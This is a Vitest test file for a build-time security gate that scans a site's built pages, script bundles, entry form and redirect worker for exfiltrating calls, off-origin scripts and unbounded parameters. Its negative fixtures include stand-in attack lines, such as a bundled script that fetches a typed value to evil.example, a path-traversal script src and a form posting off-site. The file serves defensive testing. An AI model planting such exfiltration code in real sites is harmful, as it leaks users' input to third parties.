import { describe, it, expect } from "vitest";
import { scanPages, scanEntryForm, scanWorkerSource } from "./check-entry-box.mjs";

// The gate's own mutation tests (Security consult 0811: "a gate whose only proof is 'the
// current build passes' is unfalsifiable by the gate itself"). Every negative case below
// is a build that USED to pass the pre-0811 scan — the `src=`-excluding lookahead saw
// none of the bundled ones at all.

const ONE_PAGE = { "index.html": { inline: 0, external: 0 } };

/** A minimal built page. */
const page = (rel, body) => [{ rel, html: `<!DOCTYPE html><html><body>${body}</body></html>` }];

/** Resolve every external src to a body with no forbidden call. */
const cleanAssets = () => "console.log('inert');";

describe("scanPages — the declared expectation", () => {
  it("passes a build that matches its declaration exactly", () => {
    const failures = scanPages(page("index.html", "<p>plain</p>"), ONE_PAGE, cleanAssets);
    expect(failures).toEqual([]);
  });

  it("counts a JSON-LD data block as neither inline nor external, and still allows it", () => {
    const html = '<script type="application/ld+json">{"@type":"Organization"}</script>';
    expect(scanPages(page("index.html", html), ONE_PAGE, cleanAssets)).toEqual([]);
  });

  it("fails a built page that carries no declaration — a new page cannot ship unscanned", () => {
    const failures = scanPages(page("newpage/index.html", "<p>hi</p>"), ONE_PAGE, cleanAssets);
    expect(failures.some((f) => /newpage\/index\.html.*not declared/.test(f))).toBe(true);
    expect(failures.some((f) => /index\.html.*not present in the build/.test(f))).toBe(true);
  });

  it("fails when a declared page has vanished from the build — no stale declaration stands", () => {
    const failures = scanPages([], ONE_PAGE, cleanAssets);
    expect(failures).toEqual([expect.stringMatching(/index\.html.*stale declaration/)]);
  });

  it("fails an inline script beyond the declared count", () => {
    const failures = scanPages(page("index.html", "<script>var a=1;</script>"), ONE_PAGE, cleanAssets);
    expect(failures).toEqual([expect.stringMatching(/expected 0 inline executable .*found 1/)]);
  });

  it("fails an external script beyond the declared count", () => {
    const html = '<script src="/_astro/x.abc123.js"></script>';
    const failures = scanPages(page("index.html", html), ONE_PAGE, cleanAssets);
    expect(failures).toEqual([expect.stringMatching(/expected 0 external .*found 1/)]);
  });

  it("passes an external script that IS declared, when its src shape and body are clean", () => {
    const html = '<script src="/_astro/typeahead.abc123.js"></script>';
    const declared = { "index.html": { inline: 0, external: 1 } };
    expect(scanPages(page("index.html", html), declared, cleanAssets)).toEqual([]);
  });
});

describe("scanPages — external src shape", () => {
  const declared = { "index.html": { inline: 0, external: 1 } };
  const srcFails = (src) => {
    const failures = scanPages(page("index.html", `<script src="${src}"></script>`), declared, cleanAssets);
    return failures.some((f) => /script src must be a root-relative same-origin path/.test(f));
  };

  it("rejects an off-origin, protocol-relative, traversing, or out-of-directory src", () => {
    expect(srcFails("https://evil.example/x.js")).toBe(true);
    expect(srcFails("//evil.example/x.js")).toBe(true);
    expect(srcFails("/_astro/../../etc/passwd.js")).toBe(true);
    expect(srcFails("/uploads/x.js")).toBe(true);
    expect(srcFails("/_astro/x.mjs")).toBe(true);
  });

  it("accepts the two directories the build actually emits to", () => {
    expect(srcFails("/_astro/index.DEADBEEF.js")).toBe(false);
    expect(srcFails("/js/analysis-band.js")).toBe(false);
  });

  it("fails an external src that resolves to no built asset — an unscannable body is a failure, not a pass", () => {
    const html = '<script src="/_astro/ghost.js"></script>';
    const failures = scanPages(page("index.html", html), declared, () => null);
    expect(failures).toEqual([expect.stringMatching(/does not resolve to a built asset/)]);
  });
});

describe("scanPages — network reach, inline and bundled", () => {
  it("fails a BUNDLED script whose body transmits — the exact hole the pre-0811 scan could not see", () => {
    const html = '<script src="/_astro/typeahead.abc123.js"></script>';
    const declared = { "index.html": { inline: 0, external: 1 } };
    const exfiltrating = () => 'fetch("https://evil.example/?t=" + el.value);';
    const failures = scanPages(page("index.html", html), declared, exfiltrating);
    expect(failures).toEqual([expect.stringMatching(/bundled script \/_astro\/typeahead\.abc123\.js calls/)]);
  });

  it("fails each transmit primitive in a bundled body", () => {
    const html = '<script src="/js/x.js"></script>';
    const declared = { "index.html": { inline: 0, external: 1 } };
    for (const call of ["fetch(u)", "new XMLHttpRequest()", "new WebSocket(u)", "navigator.sendBeacon(u,d)"]) {
      const failures = scanPages(page("index.html", html), declared, () => call);
      expect(failures.length, call).toBe(1);
    }
  });

  it("fails an inline script that transmits or reads .value", () => {
    const declared = { "index.html": { inline: 1, external: 0 } };
    const transmit = scanPages(page("index.html", "<script>fetch('/x')</script>"), declared, cleanAssets);
    const reads = scanPages(page("index.html", "<script>var v=el.value;</script>"), declared, cleanAssets);
    expect(transmit).toEqual([expect.stringMatching(/inline script must never call/)]);
    expect(reads).toEqual([expect.stringMatching(/inline script must never read \.value/)]);
  });

  it("allows a BUNDLED script to read .value — that is the reviewed typeahead consult 0811 signed off", () => {
    const html = '<script src="/_astro/typeahead.abc123.js"></script>';
    const declared = { "index.html": { inline: 0, external: 1 } };
    expect(scanPages(page("index.html", html), declared, () => "const q = input.value;")).toEqual([]);
  });
});

describe("scanPages — transitive chunk scan (clause 5)", () => {
  const declared = { "index.html": { inline: 0, external: 1 } };
  const html = '<script src="/_astro/entry.abc123.js"></script>';
  /** An asset tree: an entry bundle that lazily imports a chunk, as Rollup actually emits it. */
  const tree = (chunkBody, specifier = './data.def456.js') => (src) =>
    ({
      "/_astro/entry.abc123.js": `import(${JSON.stringify(specifier)});`,
      "/_astro/data.def456.js": chunkBody,
    })[src] ?? null;

  it("passes when the imported chunk is clean", () => {
    expect(scanPages(page("index.html", html), declared, tree("const rows=[];"))).toEqual([]);
  });

  it("catches a forbidden call in a chunk reachable only from inside the bundle", () => {
    // The case this clause exists for: before it, the 4 KB entry bundle was read and the
    // 342 KB chunk it pulls in was not, so the scan looked complete over half of what ships.
    const failures = scanPages(page("index.html", html), declared, tree("new WebSocket('wss://x');"));
    expect(failures).toEqual([expect.stringMatching(/data\.def456\.js calls .*WebSocket/)]);
  });

  it("follows a STATIC import as well as a dynamic one", () => {
    const readAsset = (src) =>
      ({
        "/_astro/entry.abc123.js": 'import{x}from"./data.def456.js";',
        "/_astro/data.def456.js": "fetch('/x');",
      })[src] ?? null;
    const failures = scanPages(page("index.html", html), declared, readAsset);
    expect(failures).toEqual([expect.stringMatching(/data\.def456\.js calls .*fetch/)]);
  });

  it("bars a chunk that escapes the build directories, and one that leaves the origin", () => {
    const escaped = scanPages(page("index.html", html), declared, tree("", "../secrets/x.js"));
    expect(escaped).toEqual([expect.stringMatching(/outside \/_astro\/ or \/js\//)]);

    const offOrigin = scanPages(page("index.html", html), declared, tree("", "https://evil.example/x.js"));
    expect(offOrigin).toEqual([expect.stringMatching(/non-relative specifier.*never a bare or off-origin/)]);
  });

  it("fails a chunk that does not resolve, rather than passing over the gap", () => {
    const readAsset = (src) => (src === "/_astro/entry.abc123.js" ? 'import("./missing.js");' : null);
    const failures = scanPages(page("index.html", html), declared, readAsset);
    expect(failures).toEqual([expect.stringMatching(/missing\.js does not resolve/)]);
  });

  it("fails closed on an import whose specifier is not a string literal", () => {
    // The evasion: hoist the specifier into a variable. It matches no literal pattern, so a scan
    // that merely "found no specifiers" would report a clean tree while never opening the chunk —
    // clause 5's own hole, one level down. Reproduced against the real build before this landed:
    // a computed specifier plus an exfiltrating chunk passed the gate green.
    const readAsset = (src) =>
      ({
        "/_astro/entry.abc123.js": 'const u="./data.def456.js";import(u);',
        "/_astro/data.def456.js": "fetch('https://evil.example');",
      })[src] ?? null;
    const failures = scanPages(page("index.html", html), declared, readAsset);
    expect(failures).toEqual([expect.stringMatching(/carries 1 import\(s\) whose specifier is not a string literal/)]);
  });

  it("counts a computed specifier even when other specifiers ARE literal", () => {
    const readAsset = (src) =>
      ({
        "/_astro/entry.abc123.js": 'import("./data.def456.js");const u=x;import(u);',
        "/_astro/data.def456.js": "const rows=[];",
      })[src] ?? null;
    const failures = scanPages(page("index.html", html), declared, readAsset);
    expect(failures).toEqual([expect.stringMatching(/carries 1 import\(s\)/)]);
  });

  it("terminates on a cyclic import graph and reads each chunk once", () => {
    const reads = [];
    const readAsset = (src) => {
      reads.push(src);
      return src === "/_astro/entry.abc123.js" ? 'import("./data.def456.js");' : 'import("./entry.abc123.js");';
    };
    expect(scanPages(page("index.html", html), declared, readAsset)).toEqual([]);
    expect(reads).toEqual(["/_astro/entry.abc123.js", "/_astro/data.def456.js"]);
  });
});

describe("scanPages — inline handlers", () => {
  it("fails an inline event-handler attribute on any page, not just the entry page", () => {
    const declared = { "terms/index.html": { inline: 0, external: 0 } };
    const failures = scanPages(page("terms/index.html", '<button onclick="go()">x</button>'), declared, cleanAssets);
    expect(failures).toEqual([expect.stringMatching(/inline event-handler attribute found/)]);
  });
});

describe("scanEntryForm", () => {
  const form = (attrs, inner) => `<form ${attrs} id="entry-form">${inner}</form>`;
  const OK_INNER = '<input name="ticker" type="text" /><button type="submit">Get the read</button>';

  it("passes the shipped form shape", () => {
    expect(scanEntryForm(form('action="/go/try" method="get"', OK_INNER))).toEqual([]);
  });

  it("fails an action pointed anywhere other than /go/try", () => {
    const failures = scanEntryForm(form('action="https://evil.example" method="get"', OK_INNER));
    expect(failures).toEqual([expect.stringMatching(/action must be exactly "\/go\/try"/)]);
  });

  it("fails method=post, which would carry the value off-URL", () => {
    const failures = scanEntryForm(form('action="/go/try" method="post"', OK_INNER));
    expect(failures).toEqual([expect.stringMatching(/method must be exactly "get"/)]);
  });

  it("fails an input renamed or unnamed — only one key may serialize off this form", () => {
    const renamed = scanEntryForm(form('action="/go/try" method="get"', '<input name="q" /><button type="submit">x</button>'));
    const unnamed = scanEntryForm(form('action="/go/try" method="get"', '<input /><button type="submit">x</button>'));
    expect(renamed).toEqual([expect.stringMatching(/name must be exactly "ticker"/)]);
    expect(unnamed).toEqual([expect.stringMatching(/must carry name="ticker"/)]);
  });
});

describe("scanWorkerSource", () => {
  // Column-aligned to match the real worker/index.js — the GO_DESTINATIONS scan anchors
  // on a closing `};` at the start of a line, as a top-level const declaration has.
  const OK = [
    "const TICKER_PATTERN = /^[A-Z]{1,6}$/;",
    'const SUPPORT_CATEGORIES = new Set(["billing", "broker", "read", "feedback", "other"]);',
    "const SUPPORT_REF_PATTERN = /^[0-9a-f]{8}$/;",
    'const GO_DESTINATIONS = {',
    '  "/go/try": APP_TRY_URL,',
    "};",
    "export function readUtm(searchParams) {",
    '  return { utm_source: "" };',
    "}",
    // The forwarding lives inside buildAppRedirect() in the real Worker, and the completeness
    // scan reads that function's body specifically — so the fixture carries the function too,
    // rather than the bare lines it used to. Closing `}` at column 0, as a top-level fn has.
    "export function buildAppRedirect(baseUrl, searchParams) {",
    "  const ticker = readTicker(searchParams);",
    '  dest.searchParams.set("ticker", ticker);',
    "  const category = readSupportCategory(searchParams);",
    '  dest.searchParams.set("category", category);',
    "  const ref = readSupportRef(searchParams);",
    '  dest.searchParams.set("ref", ref);',
    "  return dest.toString();",
    "}",
  ].join("\n");

  /** The fixture with `line` spliced in just before buildAppRedirect's closing brace. */
  const inForwardBody = (line) => OK.replace("  return dest.toString();", `  ${line}\n  return dest.toString();`);

  it("passes the shipped worker shape", () => {
    expect(scanWorkerSource(OK)).toEqual([]);
  });

  it("fails a /go/* destination computed from request input rather than the hardcoded literal", () => {
    const dynamic = OK.replace('"/go/try": APP_TRY_URL,', '"/go/try": url.searchParams.get("next"),');
    expect(scanWorkerSource(dynamic).length).toBeGreaterThan(0);
  });

  /* The three forwarded params, exercised through the one rule the gate now expresses over all
     of them (stock-analyst-platform#3268). Each row is mutated three ways — the mechanism away
     from URLSearchParams.set(), the bound off its pinned width, and the reader out of the data
     flow — because the gate makes the same three promises about each, and writing them out per
     param is how the ticker ended up with two of the three while reading as covered.

     These run against the fixture; the same eleven mutations were also applied to the REAL
     worker/index.js before this landed, all killed, with the pre-change gate confirmed GREEN on
     the ticker bypass (the defect #3268 reports). */
  const PARAMS = [
    {
      key: "ticker",
      reader: "readTicker",
      bound: "const TICKER_PATTERN = /^[A-Z]{1,6}$/;",
      widened: "const TICKER_PATTERN = /^[A-Z]{1,12}$/;",
    },
    {
      key: "category",
      reader: "readSupportCategory",
      bound: 'const SUPPORT_CATEGORIES = new Set(["billing", "broker", "read", "feedback", "other"]);',
      widened: 'const SUPPORT_CATEGORIES = new Set(["billing", "broker", "read", "feedback", "other", "sales"]);',
    },
    {
      key: "ref",
      reader: "readSupportRef",
      bound: "const SUPPORT_REF_PATTERN = /^[0-9a-f]{8}$/;",
      widened: "const SUPPORT_REF_PATTERN = /^[0-9a-f]+$/;",
    },
  ];

  it.each(PARAMS)("fails a $key concatenated into the redirect instead of URLSearchParams-encoded", ({ key }) => {
    const concatenated = OK.replace(`dest.searchParams.set("${key}", ${key});`, `const url = base + '?${key}=' + ${key};`);
    expect(scanWorkerSource(concatenated)).toEqual([
      expect.stringMatching(new RegExp(`must forward the ${key} via dest\\.searchParams\\.set`)),
    ]);
  });

  it.each(PARAMS)("fails a $key bound widened off the width the gate pins", ({ bound, widened }) => {
    expect(scanWorkerSource(OK.replace(bound, widened))).toEqual([
      expect.stringMatching(new RegExp(`must declare .${bound.replace(/[.*+?^${}()|[\]\\/]/g, "\\$&")}.`)),
    ]);
  });

  /* The bypass every OTHER assertion in this gate passes: read the param raw off the query,
     leave the bounded reader in the file as dead code, keep the .set() call text identical.
     Mechanism present, bound present, value never bounded. Without the provenance assertion
     this fixture returns zero failures — which is the whole point of having one per row. */
  it.each(PARAMS)("fails a $key read raw off the query, bypassing its bounded reader", ({ key, reader }) => {
    const bypassed = OK.replace(`const ${key} = ${reader}(searchParams);`, `const ${key} = searchParams.get("${key}");`);
    expect(scanWorkerSource(bypassed)).toEqual([
      expect.stringMatching(new RegExp(`must be produced by ${reader}`)),
    ]);
  });

  /* COMPLETENESS. PARAMS above and FORWARDED_PARAMS in the gate are both hand-maintained lists,
     so the three rules only ever cover what someone remembered to declare — the same one-ended
     shape one level up. These two pin the check that closes it. */
  it("fails a fourth forwarded key declared in no FORWARDED_PARAMS row, bounded reader or not", () => {
    for (const producer of ['searchParams.get("plan")', "readPlan(searchParams)"]) {
      const fourth = inForwardBody(`const plan = ${producer};\n  dest.searchParams.set("plan", plan);`);
      expect(scanWorkerSource(fourth)).toEqual([
        expect.stringMatching(/forwards "plan" onto the redirect but declares it in no FORWARDED_PARAMS row/),
      ]);
    }
  });

  it("passes a UTM key written as a literal — unrolling the Worker's UTM loop adds no forwarded param", () => {
    expect(scanWorkerSource(inForwardBody('dest.searchParams.set("utm_source", utmSource);'))).toEqual([]);
  });

  /* The quoting and method variants the scan is widened to see. Each would otherwise be a
     four-character edit away from forwarding an unbounded key past a green gate. */
  it.each([
    ["single-quoted key", "dest.searchParams.set('plan', plan);"],
    ["backtick key", "dest.searchParams.set(`plan`, plan);"],
    ["append() rather than set()", 'dest.searchParams.append("plan", plan);'],
    ["a call broken across lines", 'dest.searchParams.set(\n    "plan",\n    plan,\n  );'],
  ])("catches an undeclared key written as %s", (_label, call) => {
    expect(scanWorkerSource(inForwardBody(call))).toEqual([
      expect.stringMatching(/forwards "plan" onto the redirect but declares it in no FORWARDED_PARAMS row/),
    ]);
  });

  /* The scan reads buildAppRedirect's body, not the whole file, so a Worker that merely NAMES
     a key in a comment or a string is not failed for it. An earlier revision scanned the whole
     source and did fail both — a gate that goes red on correct code gets edited around. */
  it.each([
    ["a comment", '// historical: dest.searchParams.set("plan", plan) was never forwarded'],
    ["a string literal", 'const doc = \'dest.searchParams.set("plan", plan)\';'],
  ])("does not fail a key that only appears in %s outside the forwarding body", (_label, line) => {
    expect(scanWorkerSource(`${OK}\n${line}`)).toEqual([]);
  });

  it("fails closed when buildAppRedirect cannot be found — a scan that read nothing would pass everything", () => {
    const renamed = OK.replace("export function buildAppRedirect(", "function buildAppRedirect(");
    expect(scanWorkerSource(renamed)).toEqual([
      expect.stringMatching(/completeness scan has no body to read/),
    ]);
  });

  it("fails readUtm reading either deep-link param — neither may reach analytics", () => {
    for (const key of ["category", "ref"]) {
      const leaky = OK.replace(
        'return { utm_source: "" };',
        `return { ${key}: searchParams.get("${key}") };`,
      );
      expect(scanWorkerSource(leaky)).toEqual([
        expect.stringMatching(/readUtm\(\) must never read/),
      ]);
    }
  });

  it("fails readUtm reading the ticker — the typed value may never reach analytics", () => {
    const leaky = OK.replace('return { utm_source: "" };', 'return { ticker: searchParams.get("ticker") };');
    expect(scanWorkerSource(leaky)).toEqual([expect.stringMatching(/readUtm\(\) must never read the ticker/)]);
  });
});
